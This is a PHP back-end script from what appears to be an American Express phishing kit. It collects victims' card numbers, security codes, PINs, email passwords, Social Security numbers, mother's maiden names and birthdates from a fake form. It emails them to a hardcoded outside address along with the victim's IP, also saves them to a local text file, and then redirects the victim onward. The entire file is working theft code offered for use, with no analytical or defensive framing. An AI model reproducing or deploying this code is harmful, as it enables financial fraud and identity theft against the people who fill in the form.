<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$ccn = $_POST['ccn'];
$fn = $_POST['fn'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];
$cid = $_POST['cid'];
$csc = $_POST['csc'];
$email = $_POST['email'];
$password = $_POST['password'];
$phone              = isset($_POST['phone'])?$_POST['phone']:"";
$ssn                = isset($_POST['ssn'])?$_POST['ssn']:"";
#$birthday           = isset($_POST['birthday'])?$_POST['birthday']:"";
$mothername         = isset($_POST['mothername'])?$_POST['mothername']:"";
#$motherbirthday     = isset($_POST['motherbirthday'])?$_POST['motherbirthday']:"";
$pin                = isset($_POST['pin'])?$_POST['pin']:"";
$email                = isset($_POST['email'])?$_POST['email']:"";
$pwd                = isset($_POST['password'])?$_POST['password']:"";
$mother_d                = isset($_POST['mother_card_expired_dd'])?$_POST['mother_card_expired_dd']:"";
$mother_m                = isset($_POST['mother_card_expired_mm'])?$_POST['mother_card_expired_mm']:"";
$mother_y                = isset($_POST['mother_card_expired_yyyy'])?$_POST['mother_card_expired_yyyy']:"";
$d                = isset($_POST['card_expired_dd'])?$_POST['card_expired_dd']:"";
$m                = isset($_POST['card_expired_mm'])?$_POST['card_expired_mm']:"";
$y                = isset($_POST['card_expired_yyyy'])?$_POST['card_expired_yyyy']:"";
$mbirth = $mother_d . " / " . $mother_m . " / " . $mother_y;
$birth = $d . " / " . $m . " / " . $y;

$message .="
Full Name : ".$fn."
Card Number : ".$ccn."
Expire Month : ".$expm."
Expire Year : ".$expy."
CID : ".$cid."
CSC : ".$csc."
Email : ".$email."
Password : ".$password."
phone    : ".$phone."
ssn    : ".$ssn."
mothername    : ".$mothername."
birthdate    : ".$birth."
mother birthdate    : ".$mbirth."
pin    : ".$pin."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||xcrazy.boda@yahoo.com |=====================||\n";
$send="xcrazy.boda@yahoo.com";
$subject = "Amex RZ | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("amex.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'page4.php'</script>");
?>